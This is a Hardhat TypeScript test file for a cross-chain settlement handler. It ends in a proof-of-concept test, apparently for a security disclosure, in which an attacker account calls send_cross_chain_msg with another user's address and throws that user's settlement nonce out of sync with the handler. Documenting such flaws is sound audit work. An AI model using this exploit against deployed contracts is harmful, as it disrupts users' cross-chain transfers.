import { expect } from "chai";
import {
    loadFixture,
} from "@nomicfoundation/hardhat-toolbox/network-helpers";

import hre from "hardhat";
import { Contract } from "ethers";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

describe("ChakraSettlementHandler", function () {
    const chainId = 1;
    const chainName = "src"
    const requiredValidators = 2;
    const decimals = 8;
    const name = "MyToken"
    const symbol = "MKT"

    async function deploySettlementHandlerFixtureBase(mode: number) {
        const [
            tokenOwner,
            tokenOperator,
            verifierManager,
            settlementOwner,
            settlementHnadlerOwner,
        ] = await hre.ethers.getSigners();

        const ChakraToken = await hre.ethers.getContractFactory("ChakraToken");
        const tokenInstance = await hre.upgrades.deployProxy(ChakraToken, [
            await tokenOwner.getAddress(),
            await tokenOperator.getAddress(),
            name,
            symbol,
            decimals
        ]);

        const SettlementSignatureVerifier = await hre.ethers.getContractFactory("SettlementSignatureVerifier");
        const verifierInstance = await hre.upgrades.deployProxy(SettlementSignatureVerifier, [
            await verifierManager.getAddress(),
            requiredValidators
        ]);


        const SettlementTest = await hre.ethers.getContractFactory("SettlementTest");
        const settlmentInstance = await hre.upgrades.deployProxy(SettlementTest, [
            chainName,
            BigInt(chainId),
            await settlementOwner.getAddress(),
            await verifierInstance.getAddress(),
        ]);

        const ERC20CodecV1 = await hre.ethers.getContractFactory('ERC20CodecV1');
        const codecInstance = await hre.upgrades.deployProxy(ERC20CodecV1, [
            await settlementHnadlerOwner.getAddress(),
        ])
        const ERC20SettlementHandler = await hre.ethers.getContractFactory('ChakraSettlementHandler');
        const settlementHandlerInstance = await hre.upgrades.deployProxy(ERC20SettlementHandler, [
            await settlementHnadlerOwner.getAddress(), // owner
            mode, // mode
            chainName, //chain
            await tokenInstance.getAddress(), // token
            await codecInstance.getAddress(), // codec
            await verifierInstance.getAddress(), // verifier
            await settlmentInstance.getAddress(), // settlement

        ])

        const MessageLibTest = await hre.ethers.getContractFactory('MessageLibTest')
        const messageLibTestInstance = await MessageLibTest.deploy()

        return {
            tokenInstance,
            codecInstance,
            settlmentInstance,
            settlementHandlerInstance,
            messageLibTestInstance,
            verifierInstance,
            tokenOwner,
            tokenOperator,
            settlementOwner,
            settlementHnadlerOwner
        }
    }

    async function deploySettlementHandlerFixtureMintBurn() {
        return deploySettlementHandlerFixtureBase(0)
    }

    async function deploySettlementHandlerFixtureLockMint() {
        return deploySettlementHandlerFixtureBase(1)
    }

    async function deploySettlementHandlerFixtureBurnUnLock() {
        return deploySettlementHandlerFixtureBase(2)
    }

    async function deploySettlementHandlerFixtureLockUnlock() {
        return deploySettlementHandlerFixtureBase(3)
    }

    // ---------- PoC -----------
    it('Test Manipulate another settlement contract user nonce', async () => {
        const [
            sender,
            receiver,
            attacker,
        ] = await hre.ethers.getSigners();
        const { tokenInstance, tokenOperator, codecInstance, settlmentInstance, tokenOwner, settlementHandlerInstance, settlementHnadlerOwner, messageLibTestInstance } = await loadFixture(deploySettlementHandlerFixtureMintBurn);

        const senderAddress = await sender.getAddress()
        const receiverAddress = await receiver.getAddress()
        const settlementHandlerAddress = await settlementHandlerInstance.getAddress()
        const totalAmount = 1000000;
        await tokenInstance.connect(tokenOperator).mint_to(sender, totalAmount);


        const toChain = "dst"
        const toHandler = 1
        const toToken = 1
        const receiverAddressU256 = hre.ethers.toBigInt(Buffer.from(receiverAddress.slice(2), 'hex'))
        const amount = 1000

        await tokenInstance.connect(sender).approve(settlementHandlerAddress, 1000)

        const tx = await settlementHandlerInstance.connect(sender).cross_chain_erc20_settlement(
            toChain,
            toHandler,
            toToken,
            receiverAddressU256,
            amount
        )
        const nonceBefore = await settlmentInstance.nonce_manager(senderAddress);
        console.log("Nonce value in settlement contract before attack:", nonceBefore.toString());

        const payloadType = 5; // Assuming a payload type, e.g., for an ERC20 transfer
        const payload = "0x616263"; // Example payload data ("abc" in hex)
        await(settlmentInstance.connect(attacker).send_cross_chain_msg(
            toChain,
            senderAddress, // sender address to target
            toHandler,
            payloadType,
            payload,
        ));
        const nonceAfter = await settlmentInstance.nonce_manager(senderAddress);
        console.log("Nonce value in settlement contract after attack:", nonceAfter.toString());

        const handlerNonce = await settlementHandlerInstance.nonce_manager(senderAddress);
        console.log("Handler Contract User Nonce: ", handlerNonce.toString());
        expect(nonceAfter).to.be.not.equal(handlerNonce);
    });
});
